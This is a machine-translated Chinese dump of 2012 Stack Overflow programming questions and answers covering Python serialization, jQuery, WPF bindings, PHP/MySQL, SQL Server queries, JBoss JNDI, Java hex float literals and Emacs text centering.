## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:14:34.193

解析树输出在我看来有点噩梦。

我建议使用

```
 DIR /S | Find "Directory of" >> out.txt 
```

剪切“目录”部分并在另一台机器上以简单的 for 循环 -> mkdir 工作。

或者命令 forfiles（在 win server 2003 上工作，但可能也可以下载到 XP）

```
Forfiles /S @path 
```

将以递归方式为您提供所有绝对路径。

# python - 如何在 Python 中将文件加载为 List 类型？

> ID：11651553
> 
> 赞同：1
> 
> 时间：2012-07-25T14:04:00.213
> 
> 标签：python, string, list

我对 Python 2.5 有疑问。首先，我以列表格式保存一个文件，如下所示：

```
list_f = open("list.txt", "w")
list = [{"a" : "b", "c" : 100}, {"a" : "c", "c" : 101}]
print >> list_f, list 
```

所以，我们得到一个这样的 list.txt：

```
[{'a' : 'b', 'c': 100}, {'a' : 'c', 'c' : 101}] 
```

这是该文件中唯一的一行。请注意，列表中有两个 dict 对象，每个 dict 都有一个 String 值和一个 integer 值。

我的问题是如何加载文件并重新创建一个列表对象作为前一个对象。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:07:05.353

您*可以*使用 恢复对象`ast.literal_eval()`，但实际上您*应该*使用一些合理的序列化格式，例如 JSON 或 Python 的 pickle 模块。

例子：

```
# JSON
import json
# saving
with open("a.json", "w") as f:
    json.dump(obj, f)
# loading
with(open("a.json") as f:
    obj = json.load(f) 
```

对于泡菜，将每次出现的`json`by替换`pickle`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:06:14.580

您将使用[`json`](http://docs.python.org/library/json.html)标准库模块来代替执行`json.dump(my_list)`然后读取它`json.load(my_file_with_my_lists)`，这会将您的列表转换为 JSON 并再次读取它。

干杯。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:06:49.247

```
import ast
with open('list.txt') as f:
    output = ast.literal_eval(f.read()) 
```

作为一个真实的字典列表返回`output`，而不是作为它的字符串表示`f.read()`返回。

无论如何，如果您同时在写入和读取文件，请使用一些序列化接口，例如`cPickle`or `json`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:14:13.147

您可以从内置函数中使用这个[http://docs.python.org/library/functions.html#execfile](http://docs.python.org/library/functions.html#execfile)函数。但更好的方法是使用[http://docs.python.org/library/pickle.html](http://docs.python.org/library/pickle.html)模块将 python 数据结构存储在文件中

# javascript - jquery 或 javascript 在动态添加的元素上返回 tagName

> ID：11651556
> 
> 赞同：1
> 
> 时间：2012-07-25T14:04:05.633
> 
> 标签：javascript, jquery

嗨，我正在尝试获取一些动态添加的元素的标签名称，但每次我尝试点击时我都会得到未定义。我创建了一个模拟我的情况的简单示例。这是我的代码：

```
 <ul>
      <li>sdsa</li>
      <li>dsa</li>

  </ul>
  <button>Press</button>

 $(document).ready(function(){
           var i=0;
           $("button").on("click" , function(){
                $("ul").append("<li>" + i++ + "</li>");
           })

           $("ul").on("click" ,"li" , function(){
               alert($(this).tagName);
           })
       }) 
```

每次单击 li 标签时，我都会得到 undefined。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:05:27.487

改这个..

```
alert($(this).tagName); 
```

对这个...

```
alert(this.tagName); 
```

* * *

[`tagName`](https://developer.mozilla.org/en/DOM/element.tagName)是 DOM 元素的属性，而不是 jQuery 对象。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:05:58.997

它必须是 DOM 元素，而不是 jQuery 对象，因为 tagName 是原生 javascript 而不是 jQuery：

```
this.tagName 
```

# android - Android 计费 - 我应该实现 ServiceConnection 还是 IMarketBillingService

> ID：11651557
> 
> 赞同：1
> 
> 时间：2012-07-25T14:04:06.423
> 
> 标签：android, android-billing

我在这里查看 Android 应用内计费教程：

[http://developer.android.com/guide/google/play/billing/billing_integrate.html](http://developer.android.com/guide/google/play/billing/billing_integrate.html)

他们有实施 iMarketBillingService 的指令。但我在另一个示例中看到实现了 ServiceConnection 方法。

应该是哪一个？

我很困惑，因为我正在尝试做这样的事情：

```
 Bundle request = makeRequestBundle("CHECK_BILLING_SUPPORTED");
            Bundle response = mService.sendBillingRequest(request); 
```

但不确定 mService 变量应该是什么。在 Andoroid 的地下城教程中，他们有这个：`private BillingService mBillingService;`

但是当我尝试这样做时：

```
Bundle response = mBillingService.sendBillingRequest(request); 
```

我收到一个语法错误，指出方法 sendBillingRequest 未为 BillingService 定义。

所以基本上我对我需要使用的不同服务和接口感到困惑。请帮助我了解对我来说正确的方法是什么。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:36:04.457

我知道痛苦。我发现 android inapp billing sdk 比它应该的更复杂。坦率地说，我只是不明白，为什么它需要如此复杂。为了简化它，我基本上使用一个简单的 helloworld 进行应用内计费。让它工作，运行我的登录，然后开始担心我的逻辑。这就像在倒档行驶，但为了节省时间和精力，我将这种技术用于复杂的 sdk。

我让 helloworld 工作，并将其作为一个单独的项目。这有助于稍后在我进入升级或其他一些问题时进行调试。将其集成到我的项目中只会惹火:)。

我有一个 helloworld zip 供您下载和试用。希望能帮助到你。[只需 3 行代码即可集成 In App Billing](http://mcondev.wordpress.com/2011/06/26/integrate-in-app-billing-just-3-lines-of-code-in-your-app/)

# c# - Singleton INotifyPropertyChanged 在初始定义和绑定后不会改变

> ID：11651560
> 
> 赞同：0
> 
> 时间：2012-07-25T14:04:14.010
> 
> 标签：c#, wpf, singleton, inotifypropertychanged

因此，我创建了一个 Singleton 用于跟踪在整个应用程序中全局使用的 ToolTip 启用程序，但是当我尝试将其绑定到 ToolTip 时，它最初会绑定该值，但是当我更改 ToolTip 启用程序值时，绑定不更新。

这是创建与工具提示的绑定的用户控件：

```
 public partial class ViewTreeClass : UserControl {
      private void addStuff() {
           EnvironmentalVariables.Instance.ToolTipEnable = true;
           Binding bind = new Binding() {
                Source = EnvironmentalVariables.Instance.ToolTipEnable,
           };
           ToolTip x = new ToolTip();
           x.Content = "This is text";
           user.SetBinding(ToolTipService.IsEnabledProperty, bind);
           user.ToolTip = x;
           EnvironmentalVariables.Instance.ToolTipEnable = false;
           // Executing the above statement changes the variable, but ToolTipService.IsEnabledProperty does not change to reflect EnvironmentalVariables.Instance.ToolTipEnable
      }
 } 
```

这是实现 INotifyPropertyChanged 的​​ Singleton：

```
 public class EnvironmentalVariables : INotifyPropertyChanged {
      private static EnvironmentalVariables instance = new EnvironmentalVariables();
      public static EnvironmentalVariables Instance {
           get {
                if(instance == null) {
                     instance = new EnvironmentalVariables();
                }
                return instance;
           }
      }

      private EnvironmentalVariables() { }

      private bool tooltipEnable;
      public bool ToolTipEnable {
           get {
                return tooltipEnable;
           }
           set {
                if(tooltipEnable != value) {
                     tooltipEnable = value;
                     this.RaiseNotifyPropertyChanged("ToolTipEnable");
                }
           }
      }

      private void RaiseNotifyPropertyChanged(string property) {
           if(PropertyChanged != null) {
                PropertyChanged(this, new PropertyChangedEventArgs(property));
           }
      }

      public event PropertyChangedEventHandler PropertyChanged;
 } 
```

当我更改'EnvironmentalVariables.Instance.ToolTipEnable = false;' 它将 Singleton 变量更改为“false”，但不会将 ToolTipService.EnabledProperty 更新为“false”，并且 PropertyChanged 始终为空。我是否错过了某个地方对 PropertyChanged 的​​订阅？

Singleton 和 UC 都在不同的命名空间/类文件中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T16:14:10.187

问题在于第一次提取 IMO，即创建绑定的方式。什么类型`user`？

设置`Instance`为源和`ToolTipEnable`路径 ( `bind.Path = new PropertyPath("ToolTipEnable")`)。

你有理由使用`ToolTipService.IsEnabledProperty`而不是`ToolTip.IsEnabledProperty`吗？我不确定这是这个技巧的好地方（但我可能错了，两个都试试^^）。

您的单身人士是错误的（但不会导致问题）。我也更正了您提出活动的方式：

```
 public sealed class EnvironmentalVariables : INotifyPropertyChanged {
      private static readonly EnvironmentalVariables instance = new EnvironmentalVariables();
      public static EnvironmentalVariables Instance {
           get 
           {
               return instance;
           }
      }

      private EnvironmentalVariables() { }

      private bool tooltipEnable;
      public bool ToolTipEnable {
           get {
                return tooltipEnable;
           }
           set {
                if(tooltipEnable != value) {
                     tooltipEnable = value;
                     this.RaiseNotifyPropertyChanged("ToolTipEnable");
                }
           }
      }

      private void RaiseNotifyPropertyChanged(string property) {
           var handler = PropertyChanged;
           if(handler != null) {
                handler (this, new PropertyChangedEventArgs(property));
           }
      }

      public event PropertyChangedEventHandler PropertyChanged;
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T16:07:30.070

我相信这与没有设置`DataContext`你的有关，`ViewTreeClass`因为我真的没有看到代码有任何其他错误。尝试`DataContext`在方法开始时将 设置为单例类`addStuff()`。此外，虽然与您的问题相切，但我真的建议您在控件的 XAML 的部分类中执行您正在执行的操作，因为以编程方式创建绑定通常非常混乱。

# php - 使用 PHP 将 HTML 文本字段中的数据更新到 MySQL 数据库

> ID：11651562
> 
> 赞同：1
> 
> 时间：2012-07-25T14:04:20.073
> 
> 标签：php, mysql, html

我尝试使用 PHP 将数据从 HTML 文本字段更新到数据库。我想更新通知字段。我无法获取 SQL 查询的文本字段值。这是我的代码：

```
$result = mysql_query($query) or die (mysql_error()); // Run query
    while($row = mysql_fetch_array($result)) { ?> 
        <tr><td><?php echo $row[0];?></td>      
        <td><?php echo $row[1];?></td>
        <td><?php echo $row[2];?></td>
        <td><?php echo $row[3];?></td>
        <td><?php echo $row[4];?></td>
        <td><input type="text" name="notifications" value="<?php echo $row[5];?>" size=13></td></tr>
<?php 
if (isset($_POST['save'])) { 
    for($i = 0; $i < $count; $i++) // For loop
    {
        $id=mysql_result($result,$i,"id"); // Get id from query
        $notifications = $_POST['notifications'];
        $update = "UPDATE testtable SET notifications = {$notifications[$i]} WHERE id = {$id}";
        echo "$update<br>";
        //mysql_query($update); // Run
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:06:16.750

看起来通知字段可能是一个字符串，因此您需要使用如下引号对其进行转义：

`$update = "UPDATE testtable SET notifications = '{$notifications[$i]}' WHERE id = {$id}";`

您的代码很容易受到注入攻击，您应该使用准备好的语句并转移到 PDO 或 msqli 以抵御潜在的攻击。

# r - R完成运行时的通知？

> ID：11651567
> 
> 赞同：1
> 
> 时间：2012-07-25T14:04:41.560
> 
> 标签：r, emacs, notifications, ess

> **可能重复：**
> [有没有办法让 R 在脚本结束时发出哔哔声/播放声音？](https://stackoverflow.com/questions/3365657/is-there-a-way-to-make-r-beep-play-a-sound-at-the-end-of-a-script)

在等待 R 完成 5 到 10 分钟的工作时，我可能会开始写作（充其量），尽管我想在完成后立即回到分析中。

当 R 在 localhost 上完成分析时，我必须通知哪些选项？

例如，我可以让它响铃、打开弹出窗口、发送电子邮件吗？

我可以想象无限的可能性只是添加`system()`到代码的末尾，但还有其他选择吗？

作为记录，我通常在 中以交互方式使用 R `Emacs ESS`，但也在命令行中使用`R CMD Sweave`and `R --vanilla <`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:30:21.713

尝试`alarm()`

看到[这篇](https://stackoverflow.com/questions/3365657/is-there-a-way-to-make-r-beep-play-a-sound-at-the-end-of-a-script)文章（也许推文说它已经完成了？）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:25:19.767

如果您使用的是 linux 系统，您可能会发现这篇[文章](https://stackoverflow.com/questions/928019/how-to-make-a-gui-for-bash-scripts)很有帮助，其中使用了以下 shell 命令。

```
zenity --error --text="Testing..." 
```

您可以将其嵌入到 R 代码中，例如

```
system("zenity --error --text='Testing...'") 
```

它会提示。但是，请做好准备，不要害怕。

# sql - 根据另一列的条件从组中提取值

> ID：11651579
> 
> 赞同：1
> 
> 时间：2012-07-25T14:05:22.167
> 
> 标签：sql, sql-server, tsql, group-by, pivot

```
CREATE TABLE Items
(
  ItemId INT NOT NULL,
  CategoryId INT NOT NULL,
  ItemValue INT NOT NULL
) 
```

一个表包含项目。每个项目都属于一个类别并存储一些数值。

作为查询的结果，我希望每一行代表一个类别。应该有三列：

*   类别编号；
*   `ItemValue`每个类别最高的项目的 ID ；
*   `ItemValue`每个类别最低的项目的 ID 。

查询的性能很重要。我使用 MS SQL Server。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:21:42.357

对于 SQL Server 2005+，您可以这样做：

```
;WITH CTE AS
(
    SELECT  *, 
            ROW_NUMBER() OVER(PARTITION BY CategoryId ORDER BY ItemValue DESC) MaxRN,
            ROW_NUMBER() OVER(PARTITION BY CategoryId ORDER BY ItemValue) MinRN
    FROM Items
)
SELECT  CategoryId, 
        MIN(CASE WHEN MaxRN = 1 THEN ItemId END) IdMaxValue,
        MIN(CASE WHEN MinRN = 1 THEN ItemId END) IdMinValue
FROM CTE
GROUP BY CategoryId; 
```

这是一个[小提琴](http://sqlfiddle.com/#!3/6ab28/1)，您可以在其中测试此解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:16:34.643

我会尝试一个公用表表达式：

```
WITH CategoryHigh (High, ItemId, CategoryId) 
AS 
(
SELECT 
    ROW_NUMBER() OVER (PARTITION BY CategoryId ORDER BY ItemValue DESC) AS High,
    ItemId,
    CategoryId
FROM Items
),
CategoryLow (Low, ItemId, CategoryId) 
AS
(
SELECT 
    ROW_NUMBER() OVER (PARTITION BY CategoryId ORDER BY ItemValue) AS Low,
    ItemId,
    CategoryId
FROM Items
)
SELECT 
H.CategoryId,
L.ItemId AS LowItem,
H.ItemId AS HighItem
FROM CategoryHigh H
JOIN CategoryLow L ON H.CategoryId = L.CategoryId
WHERE H.High = 1 AND
      L.Low = 1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:37:19.060

试试这个：

```
;with 
cte as(
    select *,ROW_NUMBER() over(partition by [CategoryId] order by [ItemValue]) rownum
    from [Items] ),
cte1 as(select [CategoryId],MIN([ItemId]) [min_ItemId]
    from cte where rownum=1
    group by [CategoryId]),
cte2 as(
    select *,ROW_NUMBER() over(partition by [CategoryId] order by [ItemValue]) rownum
    from [Items] ),
cte3 as( 
    select [CategoryId],MAX([ItemId]) [max_ItemId]
    from cte2 C1
    where rownum=(select MAX(rownum) from cte C2 where C1.[CategoryId]=C2.[CategoryId])
    group by [CategoryId])
select A.[CategoryId],A.[min_ItemId],B.[max_ItemId] 
from cte1 A join cte3 B
on A.[CategoryId]=B.[CategoryId] 
```

# sql-server-2005 - 将数据类型 nvarchar 转换为 datetime 时出错

> ID：11651585
> 
> 赞同：7
> 
> 时间：2012-07-25T14:05:36.613
> 
> 标签：sql-server-2005, datetime, type-conversion

我有以下程序界面：

```
Create procedure [dbo].[InsertItemDetails]
    @TimeItemAdded datetime 
```

当我这样称呼它时：

```
EXEC [dbo].[InsertItemDetails]
     @TimeItemAdded = N'20/07/2012 00:00:00'; 
```

我收到此错误：

> 消息 8114，级别 16，状态 5
> 将数据类型 nvarchar 转换为日期时间时出错。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-25T14:09:33.960

根据您的区域设置，您传入的参数`@TimeItemAdded`可能无法识别。

您应该将日期传递为：

```
20120720 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:11:10.090

为您的日期使用明确的字符串文字。在这种情况下：

```
EXEC dbo.InsertItemDetails
    ...
    , @TimeItemAdded = '20120720'; 
```

更好的是，确保在您知道日期正确的地方传递强类型参数。理想情况下，这不应该以任何格式呈现为字符串。

像 m/d/y 这样的区域格式是个坏消息，因为鉴于用户的会话、日期格式、语言设置、机器上的区域设置等，您无法确保它们能够正常工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-11-16T08:13:10.750

SQL 读取您的日期`7/20/2012`无效，您可以使用更安全的格式传递您的日期对象，`yyyy-MM-dd`例如：`2012-07-20`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:18:13.243

这个链接有所有的日期时间格式，他们的 conntries [http://www.sql-server-helper.com/tips/date-formats.aspx](http://www.sql-server-helper.com/tips/date-formats.aspx)

您可以将其作为 varchar 传递，并使用正确的日期格式代码将其显式转换为日期时间。例如：

```
SELECT CONVERT(DATETIME, '20/07/2012 00:00:00', 103) 
```

103 是您要查找的日期时间代码。

# jboss - JBOSS 7.1 Final 中队列的 JMS 生产者/消费者

> ID：11651586
> 
> 赞同：0
> 
> 时间：2012-07-25T14:05:41.543
> 
> 标签：jboss, jms

我无法为 JMS 队列创建生产者/消费者。我尝试使用端口 1099 和 4447。

```
private static InitialContext getInitialContext() throws NamingException {
        Properties p = new Properties( );
        p.put(Context.INITIAL_CONTEXT_FACTORY,"org.jnp.interfaces.NamingContextFactory");
        p.put(Context.URL_PKG_PREFIXES," org.jboss.naming:org.jnp.interfaces");
        p.put(Context.PROVIDER_URL, "jnp://localhost:1099");

        return new javax.naming.InitialContext();

} 
```

出现错误：无法连接到端口 1099。

任何人都可以建议如何为 InitialContext 提供属性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:09:58.340

一种可能性是您正在使用不依赖于消息传递模块的启动配置 - 默认情况`standalone.xml`就是这种情况。您可以尝试使用 启动服务器以`standalone-full.xml`首先运行消息传递。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-23T20:45:33.537

JBoss 7 中不再使用端口 1099 进行 JNDI 查找。它在以前的 JBoss 版本中被 JNP 项目使用。JNP 项目已被 jboss-remoting-naming 项目所取代，该项目使用 4447 并且在配置 IntialContext 时可能需要其他属性。

有关如何使用新库的更多信息，请参阅[通过 JNDI-EJB 客户端 API 或远程命名项目的远程 EJB 调用](https://docs.jboss.org/author/display/AS71/Remote+EJB+invocations+via+JNDI+-+EJB+client+API+or+remote-naming+project)。

# xpages - 按钮事件第一次在一个服务器上触发，但不是在另一个服务器上

> ID：11651589
> 
> 赞同：0
> 
> 时间：2012-07-25T14:05:45.733
> 
> 标签：xpages

我们有一个 Dev、QA 和 Prod 环境。除了 Pistolstar 在 QA 和 prod 中运行这一事实之外，这 3 个环境之间的 Notes、OS 等版本似乎没有差异。我仍在努力确认这一点。

在页面显示后，我遇到了第一次单击时按钮未触发的事件（我没有检查其他类型的事件）。Button 在 Dev 中工作得很好，但在 QA 中却不行。这是相同的代码。

```
Value: <xp:text escape="true" id="ValueField"></xp:text>
<xp:br></xp:br>
<xp:br></xp:br>
<xp:button value="Set Random Value" id="button1">
    <xp:eventHandler event="onclick" submit="true"
        refreshMode="complete">
        <xp:this.action><![CDATA[#  {javascript:getComponent("ValueField").setValue(@Random() * 100);}]]></xp:this.action>
    </xp:eventHandler></xp:button> 
```

如果在 QA 中再次按下按钮，则它会继续工作。每次在 Dev 中第一次工作。

有没有人见过类似的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T20:31:21.763

我们大约 99.9% 确定这是 Pistolstar 问题。我们目前正在与 Pistolstar 技术支持部门合作解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T20:35:20.570

只是要确定。

*   你用的是同一个浏览器，
*   在所有环境中都使用相同的版本？
*   您是否正确签署了所有内容？

# php - 一次为多个变量分配相同的值？

> ID：11651594
> 
> 赞同：131
> 
> 时间：2012-07-25T14:06:09.637
> 
> 标签：php, variables, variable-assignment

如何一次为 PHP 中的多个变量分配相同的值？

我有类似的东西：

```
$var_a = 'A';
$var_b = 'A';
$same_var = 'A';
$var_d = 'A';
$some_var ='A'; 
```

就我而言，我不能将所有变量重命名为相同的名称（这会使事情变得更容易），那么有没有办法以更紧凑的方式为所有变量分配相同的值？

* * *

## 回答 #1

> 赞同：276
> 
> 时间：2012-07-25T14:07:20.003

```
$var_a = $var_b = $same_var = $var_d = $some_var = 'A'; 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2020-05-13T10:17:38.297

添加到另一个答案。

`$a = $b = $c = $d` 实际上意味着`$a = ( $b = ( $c = $d ) )`

PHP***默认***`int, string, etc.`按值传递原始类型，按引用传递对象。

 *这意味着

```
$c = 1234;
$a = $b = $c;
$c = 5678;
//$a and $b = 1234; $c = 5678;

$c = new Object();
$c->property = 1234;
$a = $b = $c;
$c->property = 5678;
// $a,b,c->property = 5678 because they are all referenced to same variable 
```

但是，您也可以通过值传递对象，使用关键字`clone`，但您必须使用括号。

```
$c = new Object();
$c->property = 1234;
$a = clone ($b = clone $c);
$c->property = 5678;
// $a,b->property = 1234; c->property = 5678 because they are cloned 
```

但是，您不能`&` ***使用此方法通过关键字引用传递原始类型***

```
$c = 1234;

$a = $b = &$c; // no syntax error
// $a is passed by value. $b is passed by reference of $c

$a = &$b = &$c; // syntax error

$a = &($b = &$c); // $b = &$c is okay. 
// but $a = &(...) is error because you can not pass by reference on value (you need variable)

// You will have to do manually
$b = &$c;
$a = &$b;
etc. 
```*

# c# - WinForms 实体框架代码优先支持

> ID：11651596
> 
> 赞同：2
> 
> 时间：2012-07-25T14:06:13.477
> 
> 标签：c#, .net, winforms, entity-framework-4

Winforms 是否支持**`Code-First`**实体框架。我知道 ASP.net MVC 支持它，但是 Winforms 呢？

我在 app.config 中创建连接字符串：

```
<connectionStrings>
    <add name ="Transaction" connectionString="DataSource=|DataDirectory|Transaction.sdf" providerName="System.Data.SqlServerCe.4.0"/>
  </connectionStrings> 
```

我还使用所有字段和 Transaction DbContext 创建了 Transaction 类，但是当我编译时，它不会自动创建 sdf 文件。

谢谢你。

**更新**我添加了这两行，但仍然无法正常工作：

```
Database.DefaultConnectionFactory = new SqlCeConnectionFactory("System.Data.SqlServerCe.4.0");
            Database.SetInitializer(new DropCreateDatabaseIfModelChanges<EmvTransactions>()); 
```

它给了我这个错误：

```
> An error occurred while updating the entries. See the inner exception
> for details. 
```

# mysql - 需要帮助根据 SQL Query 中的特定行信息从多列中获取数据

> ID：11651597
> 
> 赞同：1
> 
> 时间：2012-07-25T14:06:13.670
> 
> 标签：mysql, sql

您好我需要帮助从基于特定行信息（蓝色和红色）的多列中获取数据，然后为每个行条件返回不同的列。

例子 ：

来自 Table_Colours

```
ID |  Code Type  | Code
1  |  Blue       | Blue1XX
2  |  Red        | Red1XX
2  |  Blue       | Blue1XX
3  |  Red        | Red1XX
4  |  Blue       | Blue1XX
4  |  Red        | Red1XX
5  |  Blue       | Blue1XX 
```

我需要返回

```
ID | Blue     | Red   
1  | Blue1XX  |        
2  | Blue1XX  | Red1XX
3  |          | Red1XX
4  | Blue1XX  | Red1XX
5  | Blue1XX  | 
```

蓝色总是返回 Blue1XX（6 个数字代码） 红色总是返回 Red1XX（5 个数字代码）

我需要使用特定的 ID 字符串进行搜索，例如：

```
AND ID IN (
'1',
'2',
'3',
'4',
) 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:19:33.160

这假定您只有一个或没有与 ID 和特定 CodeType 匹配的内容。此外，它假设 MySQL。如果使用 SQL SERVER，删除`LIMIT 1`并放在`TOP 1`每个之后`SELECT`

```
SELECT DISTINCT ID, 
       (SELECT Code FROM MyTable AS T1 
        WHERE T1.ID=T0.ID AND T1.`Code Type`='Blue' LIMIT 1) AS BlueCode,
       (SELECT Code FROM MyTable AS T2 
        WHERE T2.ID=T0.ID AND T2.`Code Type`='Red' LIMIT 1) AS RedCode
FROM MyTable T0
WHERE T0.ID IN ('1','2','3')
ORDER BY T0.ID 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:57:29.147

```
WITH pair AS (
        WITH red AS (
                SELECT id,  zcode FROM table_colours WHERE code_type = 'Red'
                )
        , blue AS (
                SELECT id,  zcode FROM table_colours WHERE code_type = 'Blue'
                )
        SELECT COALESCE(b.id, r.id) AS id
                , b.zcode AS blue
                , r.zcode AS red
        FROM blue b
        FULL JOIN red r ON r.id = b.id
        )
SELECT * FROM pair
WHERE id IN (1,2,3,4)
        ; 
```

结果：

```
 id |  blue   |  red   
----+---------+--------
  1 | Blue1XX | 
  2 | Blue1XX | Red1XX
  4 | Blue1XX | Red1XX
  3 |         | Red1XX
(4 rows) 
```

注意：mysql-tag 是后来添加的。（mysql 不允许 CTE 的）

对 OP：你应该早先说过“它是 mysql”。在这种情况下，我不会费心创建基于 CTE 的答案。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-25T14:16:32.120

尝试这个：

```
select id, code as 'Blue', null as 'Red'
from table
where code_type like 'Blue'

union

select id, null as 'Blue', code as 'Red'
from table
where code_type like 'Red' 
```

# java - 0xp0 打印 0.0（十六进制浮点文字）

> ID：11651602
> 
> 赞同：17
> 
> 时间：2012-07-25T14:06:25.757
> 
> 标签：java

我只是想知道为什么会编译？它是什么意思，因为它确实编译？

```
System.out.println(0xp0); // p? 
```

**输出：**

```
0.0 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-25T14:11:35.457

[JLS](http://docs.oracle.com/javase/specs/jls/se7/html/jls-3.html#jls-3.10.2)对此进行了解释：

```
HexadecimalFloatingPointLiteral:
    HexSignificand BinaryExponent FloatTypeSuffixopt

HexSignificand:
    HexNumeral
    HexNumeral .
    0 x HexDigitsopt . HexDigits
    0 X HexDigitsopt . HexDigits

BinaryExponent:
    BinaryExponentIndicator SignedInteger

BinaryExponentIndicator:one of
    p P 
```

基于以上所述，我希望在`.HexDigit`之前是强制性的`p`。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-25T14:12:39.997

这是一个浮点十六进制文字。

> 对于十六进制浮点字面量，至少需要一位数字（整数部分或小数部分），指数是强制性的，浮点类型后缀是可选的。指数由 ASCII 字母 p 或 P 表示，后跟一个可选的有符号整数。

[请参阅此处](http://docs.oracle.com/javase/specs/jls/se7/html/jls-3.html#jls-3.10.2)的规范。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-02-17T20:41:42.907

仅供参考，这里是如何手动将以下转换为十进制数：

```
double hfpl = 0x1e.18p4;
System.out.println(hfpl); // 481.5 
```

[![在此处输入图像描述](../Images/a14934c3217cfb12f8718c3d9fe30d46.png)](https://i.stack.imgur.com/JAHnz.png)

# text - 如何在 Emacs 中将文本居中？

> ID：11651604
> 
> 赞同：3
> 
> 时间：2012-07-25T14:06:26.530
> 
> 标签：text, emacs, centering

是否可以在 Emacs 中进行转换：

```
<!-- inclusion du code JavaScript    -->
<!-- inclusion des feuilles de style -->
<!-- definition du ZHO               --> 
```

进入这个（大约）：

```
<!--   inclusion du code JavaScript  -->
<!-- inclusion des feuilles de style -->
<!--        definition du ZHO        --> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:10:08.897

您将变量设置`fill-column`为 nr。的列。

然后你打电话`(center-line)`

您可以这样做：

1.  （setq 填充列 100）
2.  在每一行剪切'<---'和'--->'
3.  你打电话（中线）
4.  在列 1 上调用 string-rectangle 并插入 '<---'
5.  在最后一列调用字符串矩形，并插入'--->'

要在最后一步 [3] 到达最后一列，您可以执行`(goto-char (point-min))`，然后（行尾），然后调用`(indent-line-to COL)`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-25T16:14:39.457

我已将下面的点连接为交互式命令。@nicolasdudebout 的算法或多或少是合理的，另外需要“硬”`move-to-column`来选择矩形。

选择您感兴趣的（无箭头）矩形并运行：

```
(defun center-rectangle (beg end)
  (interactive "*r")
  (kill-rectangle beg end)
  (with-temp-buffer
    (yank-rectangle)
    (setq fill-column (current-column))
    (center-region (point-min) (point-max))
    (goto-char (point-max))
    (move-to-column fill-column t)
    (kill-rectangle (point-min) (point)))
  (goto-char beg)
  (yank-rectangle)) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-25T14:21:57.347

您可以使用矩形构建一个函数或宏。这将执行以下操作：

*   剪切仅包含文本的矩形
*   将其粘贴到临时缓冲区中
*   设置`fill-column`为列数并使用`center-line`（参见 alinsoar 的答案）
*   将结果剪切为矩形
*   在原始缓冲区中将其拉回为矩形

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-16T15:05:13.033

`set-justification-center`. 也`set-justification-right`如您所料。这些功能包括认为不适当位置的换行符，因此可能会破坏段落行。

# javascript - 通过 HTTPS 获取推文

> ID：11651606
> 
> 赞同：1
> 
> 时间：2012-07-25T14:06:30.187
> 
> 标签：javascript, twitter

我正在尝试将以下代码嵌入到应该通过 HTTPS 传输的网页中。但是，此代码段会导致对 twitter.com 的两个请求，其中一个不是通过 HTTPS，这意味着浏览器会发出警告，指出我的页面“包含不安全的内容”。

```
getTwitters('name', {
  id: 'account',
  count: 3,
  withFriends: false, 
  enableLinks: false,
  ignoreReplies: true,
  newwindow: true,
  template: '<span style="blabla">%time%</span><p style="blabla">%text%</p>'
}); 
```

有没有人有一个想法：

1.  为什么只有两次获取推文的调用？
2.  为什么其中之一是由不安全的 HTTP 制作的？
3.  如何告诉 twitterjs 仅通过 HTTPS 加载我的推文？

编辑：我正在使用来自[http://code.google.com/p/twitterjs/](http://code.google.com/p/twitterjs/)的库，是的，js 文件是由 HTTPS 加载的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-26T14:40:57.577

我通过将库中的硬编码`http://`s 更改为`https://`s 解决了这个问题。我讨厌在挣扎了几个小时之后事情看起来多么简单:(

# actionscript-3 - 复制 AS3 类

> ID：11651609
> 
> 赞同：0
> 
> 时间：2012-07-25T14:06:39.433
> 
> 标签：actionscript-3, class, duplicates, clone

